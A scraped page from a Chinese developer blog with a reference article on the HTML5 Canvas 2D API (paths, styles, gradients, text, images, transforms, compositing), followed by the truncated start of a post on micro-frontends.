  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:45:42.000Z" title="Wed Dec 10 2025 02:45:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、Canvas 上下文获取与基础</h2>
<h3 data-id="heading-1">1. 获取绘图上下文</h3>
<p>javascript</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">canvas</span> = document.getElementById(<span class="hljs-string">'myCanvas'</span>)<span class="hljs-comment">;</span>
const <span class="hljs-attr">ctx</span> = canvas.getContext(<span class="hljs-string">'2d'</span>)<span class="hljs-comment">;  // 获取2D上下文</span>
// const <span class="hljs-attr">ctx3d</span> = canvas.getContext(<span class="hljs-string">'webgl'</span>)<span class="hljs-comment">;  // 获取3D上下文(WebGL)</span>
</code></pre>
<h3 data-id="heading-2">2. Canvas 元素属性</h3>
<p>javascript</p>
<pre><code class="hljs language-arduino" lang="arduino">canvas.width = <span class="hljs-number">800</span>;      <span class="hljs-comment">// 设置Canvas宽度（像素）</span>
canvas.height = <span class="hljs-number">600</span>;     <span class="hljs-comment">// 设置Canvas高度（像素）</span>
<span class="hljs-type">const</span> width = canvas.width;   <span class="hljs-comment">// 读取宽度</span>
<span class="hljs-type">const</span> height = canvas.height; <span class="hljs-comment">// 读取高度</span>
</code></pre>
<h2 data-id="heading-3">🎨 二、基本图形绘制API</h2>
<h3 data-id="heading-4">1. 矩形绘制</h3>
<p>javascript</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 填充矩形</span>
ctx.<span class="hljs-built_in">fillRect</span>(x, y, width, height);

<span class="hljs-comment">// 描边矩形</span>
ctx.<span class="hljs-built_in">strokeRect</span>(x, y, width, height);

<span class="hljs-comment">// 清除矩形区域</span>
ctx.<span class="hljs-built_in">clearRect</span>(x, y, width, height);
</code></pre>
<h3 data-id="heading-5">2. 路径绘制</h3>
<p>javascript</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 开始新路径</span>
ctx<span class="hljs-selector-class">.beginPath</span>();

<span class="hljs-comment">// 移动笔触</span>
ctx<span class="hljs-selector-class">.moveTo</span>(x, y);

<span class="hljs-comment">// 绘制直线</span>
ctx<span class="hljs-selector-class">.lineTo</span>(x, y);

<span class="hljs-comment">// 绘制圆弧</span>
ctx<span class="hljs-selector-class">.arc</span>(x, y, radius, startAngle, endAngle, anticlockwise);
<span class="hljs-comment">// anticlockwise: true逆时针，false顺时针</span>

<span class="hljs-comment">// 绘制圆弧（通过控制点）</span>
ctx<span class="hljs-selector-class">.arcTo</span>(x1, y1, x2, y2, radius);

<span class="hljs-comment">// 绘制二次贝塞尔曲线</span>
ctx<span class="hljs-selector-class">.quadraticCurveTo</span>(cp1x, cp1y, x, y);

<span class="hljs-comment">// 绘制三次贝塞尔曲线</span>
ctx<span class="hljs-selector-class">.bezierCurveTo</span>(cp1x, cp1y, cp2x, cp2y, x, y);

<span class="hljs-comment">// 绘制矩形路径</span>
ctx<span class="hljs-selector-class">.rect</span>(x, y, width, height);

<span class="hljs-comment">// 闭合路径</span>
ctx<span class="hljs-selector-class">.closePath</span>();

<span class="hljs-comment">// 填充路径</span>
ctx<span class="hljs-selector-class">.fill</span>();

<span class="hljs-comment">// 描边路径</span>
ctx<span class="hljs-selector-class">.stroke</span>();

<span class="hljs-comment">// 判断点是否在路径内</span>
const isInPath = ctx<span class="hljs-selector-class">.isPointInPath</span>(x, y);
</code></pre>
<h3 data-id="heading-6">3. 复杂路径</h3>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 椭圆</span>
ctx.<span class="hljs-built_in">ellipse</span>(x, y, radiusX, radiusY, rotation, startAngle, endAngle, anticlockwise);

<span class="hljs-comment">// 圆角矩形（需要自定义函数或较新浏览器）</span>
ctx.<span class="hljs-built_in">roundRect</span>(x, y, width, height, [radius]);
</code></pre>
<h2 data-id="heading-7"> 三、样式与颜色API</h2>
<h3 data-id="heading-8">1. 填充与描边样式</h3>
<p>javascript</p>
<pre><code class="hljs language-ini" lang="ini">// 填充颜色
<span class="hljs-attr">ctx.fillStyle</span> = <span class="hljs-string">'color'</span><span class="hljs-comment">;  // 颜色值、渐变或图案</span>
<span class="hljs-attr">ctx.fillStyle</span> = <span class="hljs-string">'#FF0000'</span><span class="hljs-comment">;</span>
<span class="hljs-attr">ctx.fillStyle</span> = <span class="hljs-string">'rgba(255, 0, 0, 0.5)'</span><span class="hljs-comment">;</span>
<span class="hljs-attr">ctx.fillStyle</span> = <span class="hljs-string">'red'</span><span class="hljs-comment">;</span>

// 描边颜色
<span class="hljs-attr">ctx.strokeStyle</span> = <span class="hljs-string">'color'</span><span class="hljs-comment">;</span>

// 透明度（全局）
<span class="hljs-attr">ctx.globalAlpha</span> = <span class="hljs-number">0.5</span><span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-9">2. 渐变</h3>
<p>javascript</p>
<pre><code class="hljs language-ini" lang="ini">// 线性渐变
const <span class="hljs-attr">linearGrad</span> = ctx.createLinearGradient(x1, y1, x2, y2)<span class="hljs-comment">;</span>
linearGrad.addColorStop(0, 'red')<span class="hljs-comment">;</span>
linearGrad.addColorStop(1, 'blue')<span class="hljs-comment">;</span>
<span class="hljs-attr">ctx.fillStyle</span> = linearGrad<span class="hljs-comment">;</span>

// 径向渐变
const <span class="hljs-attr">radialGrad</span> = ctx.createRadialGradient(x1, y1, r1, x2, y2, r2)<span class="hljs-comment">;</span>
radialGrad.addColorStop(0, 'white')<span class="hljs-comment">;</span>
radialGrad.addColorStop(1, 'black')<span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-10">3. 图案</h3>
<p>javascript</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">img</span> = new Image()<span class="hljs-comment">;</span>
<span class="hljs-attr">img.src</span> = <span class="hljs-string">'pattern.png'</span><span class="hljs-comment">;</span>
<span class="hljs-attr">img.onload</span> = function() {
    const <span class="hljs-attr">pattern</span> = ctx.createPattern(img, <span class="hljs-string">'repeat'</span>)<span class="hljs-comment">;</span>
    <span class="hljs-attr">ctx.fillStyle</span> = pattern<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>
// repeat模式: 'repeat', 'repeat-x', 'repeat-y', 'no-repeat'
</code></pre>
<h3 data-id="heading-11">4. 线条样式</h3>
<p>javascript</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">ctx.lineWidth</span> = <span class="hljs-number">5</span><span class="hljs-comment">;           // 线条宽度（像素）</span>
<span class="hljs-attr">ctx.lineCap</span> = <span class="hljs-string">'butt'</span><span class="hljs-comment">;        // 端点样式: 'butt', 'round', 'square'</span>
<span class="hljs-attr">ctx.lineJoin</span> = <span class="hljs-string">'miter'</span><span class="hljs-comment">;      // 交点样式: 'miter', 'round', 'bevel'</span>
<span class="hljs-attr">ctx.miterLimit</span> = <span class="hljs-number">10</span><span class="hljs-comment">;         // 斜接限制</span>
ctx.setLineDash(<span class="hljs-section">[5, 15]</span>)<span class="hljs-comment">;    // 设置虚线样式</span>
ctx.getLineDash()<span class="hljs-comment">;           // 获取虚线样式</span>
<span class="hljs-attr">ctx.lineDashOffset</span> = <span class="hljs-number">5</span><span class="hljs-comment">;      // 虚线偏移量</span>
</code></pre>
<h2 data-id="heading-12">四、文本绘制API</h2>
<h3 data-id="heading-13">1. 文本绘制</h3>
<p>javascript</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 填充文本</span>
ctx.<span class="hljs-built_in">fillText</span>(text, x, y [, maxWidth]);

<span class="hljs-comment">// 描边文本</span>
ctx.<span class="hljs-built_in">strokeText</span>(text, x, y [, maxWidth]);

<span class="hljs-comment">// 测量文本</span>
<span class="hljs-type">const</span> metrics = ctx.<span class="hljs-built_in">measureText</span>(text);
metrics.width;      <span class="hljs-comment">// 文本宽度</span>
metrics.actualBoundingBoxLeft;   <span class="hljs-comment">// 左边界距离</span>
metrics.actualBoundingBoxRight;  <span class="hljs-comment">// 右边界距离</span>
</code></pre>
<h3 data-id="heading-14">2. 文本样式</h3>
<p>javascript</p>
<pre><code class="hljs language-perl" lang="perl">ctx.font = <span class="hljs-string">'italic bold 20px Arial'</span>;  <span class="hljs-regexp">//</span> 字体样式
ctx.textAlign = <span class="hljs-string">'center'</span>;     <span class="hljs-regexp">//</span> 对齐: <span class="hljs-string">'left'</span>, <span class="hljs-string">'center'</span>, <span class="hljs-string">'right'</span>, <span class="hljs-string">'start'</span>, <span class="hljs-string">'end'</span>
ctx.textBaseline = <span class="hljs-string">'middle'</span>;  <span class="hljs-regexp">//</span> 基线: <span class="hljs-string">'top'</span>, <span class="hljs-string">'hanging'</span>, <span class="hljs-string">'middle'</span>, <span class="hljs-string">'alphabetic'</span>, <span class="hljs-string">'ideographic'</span>, <span class="hljs-string">'bottom'</span>
ctx.direction = <span class="hljs-string">'ltr'</span>;        <span class="hljs-regexp">//</span> 方向: <span class="hljs-string">'ltr'</span>, <span class="hljs-string">'rtl'</span>, <span class="hljs-string">'inherit'</span>
</code></pre>
<h2 data-id="heading-15">五、图像操作API</h2>
<h3 data-id="heading-16">1. 绘制图像</h3>
<p>javascript</p>
<pre><code class="hljs language-scss" lang="scss">const <span class="hljs-selector-tag">img</span> = new <span class="hljs-built_in">Image</span>();
<span class="hljs-selector-tag">img</span><span class="hljs-selector-class">.src</span> = 'image<span class="hljs-selector-class">.jpg</span>';

<span class="hljs-comment">// 基本绘制</span>
ctx<span class="hljs-selector-class">.drawImage</span>(img, dx, dy);

<span class="hljs-comment">// 缩放绘制</span>
ctx<span class="hljs-selector-class">.drawImage</span>(img, dx, dy, dWidth, dHeight);

<span class="hljs-comment">// 切片绘制</span>
ctx<span class="hljs-selector-class">.drawImage</span>(img, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight);
<span class="hljs-comment">// sx,sy: 源图像起始坐标</span>
<span class="hljs-comment">// sWidth,sHeight: 源图像裁切尺寸</span>
<span class="hljs-comment">// dx,dy: 目标位置</span>
<span class="hljs-comment">// dWidth,dHeight: 目标尺寸</span>
</code></pre>
<h3 data-id="heading-17">2. 图像数据操作</h3>
<p>javascript</p>
<pre><code class="hljs language-ini" lang="ini">// 获取图像数据
const <span class="hljs-attr">imageData</span> = ctx.getImageData(sx, sy, sw, sh)<span class="hljs-comment">;</span>
// imageData.data: Uint8ClampedArray <span class="hljs-section">[R,G,B,A,R,G,B,A,...]</span>

// 放置图像数据
ctx.putImageData(imageData, dx, dy)<span class="hljs-comment">;</span>

// 创建空白图像数据
const <span class="hljs-attr">newImageData</span> = ctx.createImageData(width, height)<span class="hljs-comment">;</span>
const <span class="hljs-attr">newImageData2</span> = ctx.createImageData(imageData)<span class="hljs-comment">;  // 相同尺寸</span>
</code></pre>
<h2 data-id="heading-18">六、变形与合成API</h2>
<h3 data-id="heading-19">1. 坐标变换</h3>
<p>javascript</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 平移</span>
ctx<span class="hljs-selector-class">.translate</span>(x, y);

<span class="hljs-comment">// 旋转（弧度）</span>
ctx<span class="hljs-selector-class">.rotate</span>(angle);

<span class="hljs-comment">// 缩放</span>
ctx<span class="hljs-selector-class">.scale</span>(x, y);

<span class="hljs-comment">// 变换矩阵</span>
ctx<span class="hljs-selector-class">.transform</span>(a, b, c, d, e, f);
<span class="hljs-comment">// a: 水平缩放  b: 水平倾斜</span>
<span class="hljs-comment">// c: 垂直倾斜  d: 垂直缩放</span>
<span class="hljs-comment">// e: 水平移动  f: 垂直移动</span>

<span class="hljs-comment">// 设置变换矩阵</span>
ctx<span class="hljs-selector-class">.setTransform</span>(a, b, c, d, e, f);

<span class="hljs-comment">// 重置变换</span>
ctx<span class="hljs-selector-class">.resetTransform</span>();
</code></pre>
<h3 data-id="heading-20">2. 状态保存与恢复</h3>
<p>javascript</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 保存当前状态（样式、变形等）</span>
ctx<span class="hljs-selector-class">.save</span>();

<span class="hljs-comment">// 恢复上次保存的状态</span>
ctx<span class="hljs-selector-class">.restore</span>();
</code></pre>
<h3 data-id="heading-21">3. 合成与裁剪</h3>
<p>javascript</p>
<pre><code class="hljs language-perl" lang="perl">// 全局合成操作
ctx.globalCompositeOperation = <span class="hljs-string">'source-over'</span>;
<span class="hljs-regexp">//</span> 常用值: <span class="hljs-string">'source-over'</span>, <span class="hljs-string">'source-in'</span>, <span class="hljs-string">'source-out'</span>, 
<span class="hljs-regexp">//</span> <span class="hljs-string">'destination-over'</span>, <span class="hljs-string">'destination-in'</span>, <span class="hljs-string">'destination-out'</span>,
<span class="hljs-regexp">//</span> <span class="hljs-string">'lighter'</span>, <span class="hljs-string">'copy'</span>, <span class="hljs-string">'xor'</span>, <span class="hljs-string">'multiply'</span>, <span class="hljs-string">'screen'</span>, <span class="hljs-string">'overlay'</span>,
<span class="hljs-regexp">//</span> <span class="hljs-string">'darken'</span>, <span class="hljs-string">'lighten'</span>, <span class="hljs-string">'color-dodge'</span>, <span class="hljs-string">'color-burn'</span>, 
<span class="hljs-regexp">//</span> <span class="hljs-string">'hard-light'</span>, <span class="hljs-string">'soft-light'</span>, <span class="hljs-string">'difference'</span>, <span class="hljs-string">'exclusion'</span>,
<span class="hljs-regexp">//</span> <span class="hljs-string">'hue'</span>, <span class="hljs-string">'saturation'</span>, <span class="hljs-string">'color'</span>, <span class="hljs-string">'luminosity'</span>

// 创建裁剪区域
ctx.clip();  <span class="hljs-regexp">//</span> 基于当前路径创建裁剪区域

// 判断点是否在裁剪区域内
const isInClip = ctx.isPointInStroke(<span class="hljs-keyword">x</span>, <span class="hljs-keyword">y</span>);
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[微前端：从“大前端”到“积木式开发”的架构演进]]></title>    <link>https://juejin.cn/post/7581727073582121011</link>    <guid>https://juejin.cn/post/7581727073582121011</guid>    <pubDate>2025-12-10T02:52:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581727073582121011" data-draft-id="7581698635866636314" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="微前端：从“大前端”到“积木式开发”的架构演进"/> <meta itemprop="keywords" content="前端,架构,前端框架"/> <meta itemprop="datePublished" content="2025-12-10T02:52:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="扑棱蛾子"/> <meta itemprop="url" content="https://juejin.cn/user/2823201593493790"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            微前端：从“大前端”到“积木式开发”的架构演进
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2823201593493790/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    扑棱蛾子
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:52:39.000Z" title="Wed Dec 10 2025 02:52:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body 